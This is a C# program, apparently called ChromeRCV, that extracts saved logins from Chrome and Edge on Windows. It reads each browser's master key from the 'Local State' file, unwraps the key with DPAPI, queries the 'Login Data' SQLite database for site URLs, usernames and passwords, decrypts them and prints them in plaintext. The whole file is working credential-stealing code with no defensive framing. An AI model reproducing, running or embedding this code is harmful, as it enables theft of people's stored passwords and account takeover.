using System;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Data.SQLite;
using System.Security.Cryptography;

namespace ChromeRCV
{
    class Program
    {
        private static string LocalAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        private static List<string> Browsers = new List<string>
        {
            LocalAppdata + "\\Google\\Chrome",
            LocalAppdata + "\\Google(x86)\\Chrome",
            LocalAppdata + "\\Microsoft\\Edge"
        };

        public static byte[] GetMasterKey(string directory)
        {
            string filePath = directory + "\\Local State";

            if (File.Exists(filePath) == false)
                return null;

            string data = File.ReadAllText(filePath);
            byte[] masterKey = Convert.FromBase64String(SimpleJSON.JSON.Parse(data)["os_crypt"]["encrypted_key"]);

            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex) {
                Console.WriteLine(ex.ToString());
            }
            return null;
        }

        public static string DPAPIDecrypt(string encryptedData)
        {
            if( encryptedData.Length <= 0 || encryptedData == string.Empty )
                return string.Empty;

            string decryptedData = Encoding.UTF8.GetString(
                ProtectedData.Unprotect(
                    Encoding.Default.GetBytes(encryptedData), null, DataProtectionScope.CurrentUser
                )
            );
            return decryptedData;
        }

        public static string DecryptPassword(string password, byte[] key)
        {
            // chrome version >= 80
            if (password.StartsWith("v10") || password.StartsWith("v11"))
            {
                byte[] bytePass = Encoding.Default.GetBytes(password);
                byte[] iv = bytePass.Skip(3).Take(12).ToArray();
                byte[] encryptedData = bytePass.Skip(15).ToArray();

                return Encoding.UTF8.GetString(Sodium.SecretAeadAes.Decrypt(encryptedData, iv, key));
            } else {
                // chrome version < 80
                return DPAPIDecrypt(password);
            }
        }

        public static void GetChromiumLogins(string loginDataPath, byte[] key, ref List<ChromiumLogin> logins)
        {
            string tempFile = Utils.CreateTempFile(loginDataPath);

            using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + tempFile + ";Version=3;New=True;Compress=True;")) {
                conn.Open();

                using (SQLiteCommand comm = conn.CreateCommand()) {
                    comm.CommandText = "SELECT origin_url, username_value, password_value FROM logins";

                    using (SQLiteDataReader reader = comm.ExecuteReader()) {
                        while (reader.Read()) {
                            string hostname = (string)reader["origin_url"];
                            string username = (string)reader["username_value"];
                            string password = Encoding.Default.GetString((byte[])reader["password_value"]);

                            if (string.IsNullOrEmpty(password))
                                break;

                            logins.Add(new ChromiumLogin(hostname, username, DecryptPassword(password, key)));
                        }
                    }
                }
                conn.Close();
            }
            try {
                File.Delete(tempFile);
            } catch {
                Console.WriteLine($"Failed to delete {tempFile.ToUpper()}");
            }
        }

        static void Main(string[] args)
        {
            List<ChromiumLogin> logins = new List<ChromiumLogin>();

            foreach(string browserPath in Browsers) {
                if(Directory.Exists(browserPath)) {
                    byte[] key = GetMasterKey(browserPath + "\\User Data");
                    if (key == null)
                        return;

                    string loginDataPath = browserPath + "\\User Data\\Default\\Login Data";
                    GetChromiumLogins(loginDataPath, key, ref logins);
                }
            }

            foreach(var login in logins) {
                Console.WriteLine(login.ToString());
            }
            Console.ReadLine();
        }
    }
}
